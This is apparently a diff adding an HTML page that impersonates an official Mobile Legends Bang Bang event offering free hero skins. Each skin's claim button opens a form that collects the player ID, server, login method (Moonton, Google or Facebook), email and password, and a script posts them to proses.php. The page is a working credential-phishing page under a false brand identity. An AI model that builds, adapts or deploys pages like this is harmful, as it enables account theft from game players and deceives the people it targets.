@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Event Collaboration</title>
+    <meta name="description" content="Follow Event Mobile Legends Bang Bang and Claim your Favorite Skin!">
+    <meta name="keywords" content="Mobile Legends, Claim Skin, Free, Moonton, Event Skin ML, Skin MLBB, Skin Gratis ML">
+    <meta name="author" content="Moonton Event Team">
+    <meta property="og:title" content="Mobile Legends Bang Bang">
+    <meta property="og:description" content="Follow Our Event and Get Your Favorite Skin">
+    <meta property="og:image" content="https://e.top4top.io/p_3406vc06p0.png">
+    <meta property="og:url" content="https://mobilelegends.com">
+    <meta property="og:type" content="website">
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: url('') no-repeat center center fixed;
+            background-size: cover;
+            color: #ebebeb;
+        }
+        .container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            padding: 30px;
+            gap: 20px;
+        }
+        .card {
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 10px;
+            width: 250px;
+            text-align: center;
+            padding: 20px;
+        }
+        .card img {
+            width: 100%;
+            border-radius: 10px;
+        }
+        .card h3 {
+            margin: 15px 0 10px;
+        }
+        .card button {
+            padding: 10px 20px;
+            background-color: #ffcc00;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .form-popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(0,0,0,0.9);
+            padding: 30px;
+            border-radius: 10px;
+            z-index: 1000;
+            color: white;
+            width: 90%;
+            max-width: 400px;
+        }
+        .form-popup input,
+        .form-popup select {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+        }
+        .form-popup button {
+            width: 100%;
+            background: #ffcc00;
+            color: black;
+            padding: 10px;
+            font-weight: bold;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 999;
+        }
+        @media(max-width: 600px) {
+            .card {
+                width: 90%;
+            }
+        }
+        .karranLogo {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+        }
+        karranp {
+        color: #000;
+        position: fixed;
+        }
+    </style>
+</head>
+<body>
+<center>
+    <img src="i/logo.png" class="karranLogo">
+</center>
+
+<div class="container">
+    <div class="card"><img src="i/lucas.jpg"><h3>Lucas (Naruto Uzumaki)</h3><button onclick="openForm('Lucas (Naruto Uzumaki)')">Klaim</button></div>
+    <div class="card"><img src="i/suyou.jpg"><h3>Suyou (Sasuke Uchiha)</h3><button onclick="openForm('Suyou (Sasuke Uchiha)')">Klaim</button></div>
+    <div class="card"><img src="i/hayabusa.jpg"><h3>Hayabusa (Kakashi Hatake)</h3><button onclick="openForm('Hayabusa (Kakashi Hatake)')">Klaim</button></div>
+    <div class="card"><img src="i/kalea.jpg"><h3>Kalea (Sakura Haruno)</h3><button onclick="openForm('Kalea (Sakura Haruno)')">Klaim</button></div>
+    <div class="card"><img src="i/lingNeobeast.jpg"><h3>Ling (Neobeast Ling)</h3><button onclick="openForm('Ling (Neobeast Ling)')">Klaim</button></div>
+    <div class="card"><img src="i/pharsaNeobeast.jpg"><h3>Pharsa (Neobeast Pharsa)</h3><button onclick="openForm('Pharsa (Neobeast Pharsa)')">Klaim</button></div>
+    <div class="card"><img src="i/brodiNeobeast.jpg"><h3>Brodi (Neobeast Brodi)</h3><button onclick="openForm('Brodi (Neobeast Brodi)')">Klaim</button></div>
+    <div class="card"><img src="i/lancelotKishin.jpg"><h3>Lancelot (Kishin Zensetsu)</h3><button onclick="openForm('Lancelot (Kishin Zensetsu)')">Klaim</button></div>
+    <div class="card"><img src="i/angelaKishin.jpg"><h3>Angela (Kishin Zensetsu)</h3><button onclick="openForm('Angela (Kishin Zensetsu)')">Klaim</button></div>
+    <div class="card"><img src="i/karrieKishin.jpg"><h3>Karrie (Kishin Zensetsu)</h3><button onclick="openForm('Karrie (Kishin Zensetsu)')">Klaim</button></div>
+    <div class="card"><img src="i/yinAOT.jpg"><h3>Yin (Attack On Titan)</h3><button onclick="openForm('Yin (Attack On Titan)')">Klaim</button></div>
+    <div class="card"><img src="i/fannyAOT.jpg"><h3>Fanny (Attack On Titan)</h3><button onclick="openForm('Fanny (Attack On Titan)')">Klaim</button></div>
+    <div class="card"><img src="i/martisAOT.jpg"><h3>Martis (Attack On Titan)</h3><button onclick="openForm('Martis (Attack On Titan)')">Klaim</button></div>
+    <div class="card"><img src="i/leomordDucati.jpg"><h3>Leomord (Ducati)</h3><button onclick="openForm('Leomord (Ducati)')">Klaim</button></div>
+    <div class="card"><img src="i/benedettaDucati.jpg"><h3>Benedetta (Ducati)</h3><button onclick="openForm('Benedetta (Ducati)')">Klaim</button></div>
+    <div class="card"><img src="i/irithelDucati.jpg"><h3>Irithel (Ducati)</h3><button onclick="openForm('Irithel (Ducati)')">Klaim</button></div>
+    <div class="card"><img src="i/nolan11.jpg"><h3>Nolan (11.11)</h3><button onclick="openForm('Nolan (11.11)')">Klaim</button></div>
+    <div class="card"><img src="i/hayabusa11.jpg"><h3>Hayabusa (11.11)</h3><button onclick="openForm('Hayabusa (11.11)')">Klaim</button></div>
+    <div class="card"><img src="i/gusion11.jpg">
+    <h3>Gusion (11.11)</h3>
+    <button onclick="openForm('Gusion (11.11)')">Klaim</button>
+    </div>
+    <div class="card"><img src="i/francoLegend.jpg"><h3>Franco (Legend)</h3><button onclick="openForm('Franco (Legend)')">Klaim</button></div>
+    <div class="card"><img src="i/freyaLegend.jpg"><h3>Freya (Legend)</h3><button onclick="openForm('Freya (Legend)')">Klaim</button></div>
+    <div class="card"><img src="i/julianJJK.jpg"><h3>Julian (Fushiguro Megumi)</h3><button onclick="openForm('Julian (Fushiguro Megumi)')">Klaim</button></div>
+    <div class="card"><img src="i/xavierJJK.jpg"><h3>Xavier (Satorou Gojo)</h3><button onclick="openForm('Xavier (Satorou Gojo)')">Klaim</button></div>
+    <div class="card"><img src="i/melissaJJK.jpg"><h3>Melissa (Nobara Kugisaki)</h3><button onclick="openForm('Melissa (Nobara Kugisaki)')">Klaim</button></div>
+</div>
+<center>
+<p><font color="black">Copyrights &copy; 2025 Mobile Legends Bang Bang</font></p>
+</center>
+<div class="overlay" onclick="closeForm()"></div>
+
+<div class="form-popup" id="claimForm">
+    <h2>Klaim Skin <span id="skinName"></span></h2>
+    <input type="text" placeholder="ID" id="playerId">
+    <input type="text" placeholder="Server" id="serverId">
+    <select id="loginMethod">
+        <option value="">Login with</option>
+        <option value="Moonton">Moonton</option>
+        <option value="Google">Google</option>
+        <option value="Facebook">Facebook</option>
+    </select>
+    <input type="email" placeholder="Email" id="email">
+    <input type="password" placeholder="Password" id="password">
+    <button onclick="submitForm()">Kirim</button>
+</div>
+<p><karranp>Copyrights &copy; 2025 Mobile Legends Bang Bang</karranp></p>
+<script>
+    function openForm(skin) {
+        document.getElementById('skinName').innerText = skin;
+        document.getElementById('claimForm').style.display = 'block';
+        document.querySelector('.overlay').style.display = 'block';
+        window.selectedSkin = skin;
+    }
+
+    function closeForm() {
+        document.getElementById('claimForm').style.display = 'none';
+        document.querySelector('.overlay').style.display = 'none';
+    }
+
+    function submitForm() {
+        const skinName = window.selectedSkin || '';
+        const playerId = document.getElementById('playerId').value;
+        const serverId = document.getElementById('serverId').value;
+        const loginMethod = document.getElementById('loginMethod').value;
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        if (playerId && serverId && loginMethod && email && password) {
+            const formData = new FormData();
+            formData.append("skinName", skinName);
+            formData.append("playerId", playerId);
+            formData.append("serverId", serverId);
+            formData.append("loginMethod", loginMethod);
+            formData.append("email", email);
+            formData.append("password", password);
+
+            fetch("proses.php", {
+                method: "POST",
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => {
+                alert(data);
+                closeForm();
+            })
+            .catch(error => {
+                alert("Failed sending!");
+                console.error(error);
+            });
+        } else {
+            alert('Please complete all');
+        }
+    }
+</script>
+</body>
+</html>
